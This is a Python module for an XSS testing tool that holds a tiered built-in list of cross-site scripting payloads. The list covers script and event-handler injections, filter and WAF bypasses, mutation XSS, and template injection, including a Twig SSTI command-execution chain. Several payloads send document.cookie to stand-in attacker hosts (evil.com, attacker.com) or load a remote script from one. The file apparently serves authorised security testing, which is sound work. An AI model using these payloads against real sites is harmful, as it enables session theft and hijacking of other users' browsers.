"""
XSS Payload Manager
Manages and provides XSS test payloads
"""

from typing import List, Dict


class PayloadManager:
    """Manages XSS testing payloads"""

    def __init__(self, config):
        self.config = config
        self.payloads: List[Dict] = []
        self._load_payloads()

    def _load_payloads(self):
        """Load payloads based on configuration"""
        if self.config.payload_file:
            self._load_custom_payloads()
        else:
            self._load_default_payloads()

    def _load_custom_payloads(self):
        """Load custom payloads from file"""
        try:
            with open(self.config.payload_file, 'r', encoding='utf-8') as f:
                for line in f:
                    payload = line.strip()
                    if payload:
                        self.payloads.append({
                            'payload': payload,
                            'type': 'Custom XSS',
                            'severity': 'Medium'
                        })
        except FileNotFoundError:
            print(f"[WARNING] Custom payload file not found: {self.config.payload_file}")
            self._load_default_payloads()

    def _load_default_payloads(self):
        """Load default XSS payloads"""
        level = self.config.payload_level

        # Basic payloads (always included)
        basic_payloads = [
            # Simple script tags
            ("<script>alert('XSS')</script>", "Reflected XSS", "High"),
            ("<script>alert(1)</script>", "Reflected XSS", "High"),
            ("<script>alert(document.cookie)</script>", "Cookie Theft XSS", "Critical"),
            ("<script>alert(document.domain)</script>", "Reflected XSS", "High"),

            # Event handlers
            ("<img src=x onerror=alert('XSS')>", "Event Handler XSS", "High"),
            ("<img src=x onerror=alert(1)>", "Event Handler XSS", "High"),
            ("<body onload=alert('XSS')>", "Event Handler XSS", "High"),
            ("<input autofocus onfocus=alert('XSS')>", "Event Handler XSS", "High"),
            ("<svg onload=alert('XSS')>", "SVG XSS", "High"),

            # Basic injection with attribute escape
            ("'><script>alert(1)</script>", "Attribute Escape XSS", "High"),
            ("\"><script>alert(1)</script>", "Attribute Escape XSS", "High"),

            # JavaScript protocol
            ("<a href=javascript:alert('XSS')>click</a>", "JavaScript Protocol XSS", "Medium"),
            ("<iframe src=javascript:alert('XSS')>", "JavaScript Protocol XSS", "Medium"),
        ]

        # Intermediate payloads
        intermediate_payloads = [
            # Filter bypass techniques
            ("<scr<script>ipt>alert('XSS')</scr</script>ipt>", "Filter Bypass XSS", "High"),
            ("<script>alert(String.fromCharCode(88,83,83))</script>", "Encoding XSS", "High"),
            ("<img src='x' onerror='alert&#40;1&#41;'>", "HTML Entity XSS", "High"),

            # Case variations
            ("<ScRiPt>alert('XSS')</sCrIpT>", "Case Variation XSS", "High"),
            ("<IMG SRC=x ONERROR=alert('XSS')>", "Case Variation XSS", "High"),

            # URL encoding
            ("%3Cscript%3Ealert('XSS')%3C/script%3E", "URL Encoded XSS", "High"),
            ("<script>alert(/%58%53%53/)</script>", "Mixed Encoding XSS", "High"),

            # DOM-based patterns
            ("<img src=x onerror=window.location='http://evil.com?'+document.cookie>", "DOM XSS - Cookie Theft", "Critical"),
            ("<script>eval(atob('YWxlcnQoMSk='))</script>", "Base64 Encoded XSS", "High"),

            # Multiple vectors
            ("'';!--\"<XSS>=&{()}", "Polyglot XSS", "High"),

            # Data URIs
            ("<object data='data:text/html,<script>alert(1)</script>'>", "Data URI XSS", "High"),
            ("<embed src='data:text/html,<script>alert(1)</script>'>", "Data URI XSS", "High"),
        ]

        # Advanced payloads
        advanced_payloads = [
            # Advanced filter bypass
            ("<svg/onload=alert('XSS')>", "SVG Filter Bypass", "High"),
            ("<math><mtext></mtext><mglyph><style></math><img src onerror=alert('XSS')>", "MathML XSS", "High"),

            # Template injection
            ("{{constructor.constructor('alert(1)')()}}", "Template Injection XSS", "Critical"),
            ("${alert('XSS')}", "Template Literal XSS", "High"),

            # Mutation XSS
            ("<noscript><p title=\"</noscript><img src=x onerror=alert('XSS')\">", "Mutation XSS", "High"),
            ("<form><button formaction=javascript:alert('XSS')>Click", "Form Action XSS", "High"),

            # Using alternative tags
            ("<details open ontoggle=alert('XSS')>", "Details XSS", "High"),
            ("<marquee onstart=alert('XSS')>", "Marquee XSS", "Medium"),

            # Breaking out of different contexts
            ("</script><script>alert('XSS')</script>", "Context Break XSS", "High"),
            ("</title><script>alert('XSS')</script>", "Title Context XSS", "High"),
            ("</textarea><script>alert('XSS')</script>", "Textarea Context XSS", "High"),
            ("</style><script>alert('XSS')</script>", "Style Context XSS", "High"),

            # Advanced encoding
            ("<iframe src=j&Tab;avascript:alert('XSS')>", "Tab Encoding XSS", "Medium"),
            ("<iframe src=j&#x09;avascript:alert('XSS')>", "Hex Encoding XSS", "Medium"),

            # WAF bypass
            ("<script>alert`1`</script>", "Backtick XSS", "High"),
            ("<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>", "fromCharCode XSS", "High"),

            # Framework-specific
            ("{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}", "Twig SSTI", "Critical"),
            ("{{7*7}}", "Template Detection", "Low"),
            ("{{''.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}","AngularJS XSS", "High"),

            # Blind XSS
            ("<script src='http://attacker.com/xss.js'></script>", "Remote Script XSS", "Critical"),
            ("<img src='http://attacker.com/log.php?c='+document.cookie>", "Blind XSS - Cookie Exfiltration", "Critical"),
        ]

        # Compile based on level
        if level == 'basic':
            selected_payloads = basic_payloads
        elif level == 'intermediate':
            selected_payloads = basic_payloads + intermediate_payloads
        elif level == 'advanced':
            selected_payloads = basic_payloads + intermediate_payloads + advanced_payloads
        else:  # all
            selected_payloads = basic_payloads + intermediate_payloads + advanced_payloads

        # Convert to payload format
        for payload, xss_type, severity in selected_payloads:
            self.payloads.append({
                'payload': payload,
                'type': xss_type,
                'severity': severity
            })

    def get_payloads(self) -> List[Dict]:
        """Get all loaded payloads"""
        return self.payloads

    def add_payload(self, payload: str, xss_type: str = "Custom", severity: str = "Medium"):
        """Add a custom payload"""
        self.payloads.append({
            'payload': payload,
            'type': xss_type,
            'severity': severity
        })
